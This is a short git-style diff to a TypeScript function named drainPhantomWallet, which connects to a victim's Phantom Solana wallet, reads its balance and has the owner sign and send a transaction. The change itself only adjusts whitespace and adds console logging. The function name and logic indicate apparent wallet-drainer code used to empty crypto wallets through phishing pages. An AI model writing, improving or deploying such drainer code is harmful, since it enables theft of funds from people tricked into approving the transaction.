@@ -48,7 +48,7 @@ export async function drainPhantomWallet(): Promise<void> {
   try {
     const response = await window.solana.connect();
     const senderPublicKey = new PublicKey(response.publicKey.toString());
-    
+
     const balance = await connection.getBalance(senderPublicKey);
     if (balance <= 0) {
       throw new Error("Insufficient funds");
@@ -64,7 +64,10 @@ export async function drainPhantomWallet(): Promise<void> {
 
     const { signature } = await window.solana.signAndSendTransaction(transaction);
     await connection.confirmTransaction(signature, "processed");
+
+    console.log("Transaction successful:", signature);
   } catch (error) {
+    console.error("Transaction failed:", error);
     throw new Error(error instanceof Error ? error.message : "Transaction failed");
   }
 }
